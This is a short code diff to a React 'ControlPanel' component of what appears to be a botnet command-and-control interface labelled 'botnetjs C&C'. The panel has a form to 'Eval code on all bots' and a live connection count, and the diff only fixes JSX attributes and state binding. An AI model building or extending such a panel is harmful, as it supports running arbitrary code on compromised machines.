@@ -7,16 +7,16 @@ var ControlPanel = React.createClass({
                 <DefaultLayout title={this.props.title}>
                     <div>This is the control panel.</div>
                     <header>botnetjs C&amp;C</header>
-                    <div class="controls">
+                    <div className="controls">
                         <form onSubmit="evalAllBots()">
                         <label>Eval code on all bots</label>
                         <textarea name="evalme" />
                         <input type="submit" value="Submit" />
                         </form>
                     </div>
-                    <div class="connections_wrapper">
-                        <div class="connections_box">
-                            <div id="connections_count">-1</div> connections
+                    <div className="connections_wrapper">
+                        <div className="connections_box">
+                            <div id="connections_count">{this.state.connectionCount}</div> connections
                         </div>
                         <div id="connections_list"></div>
                     </div>
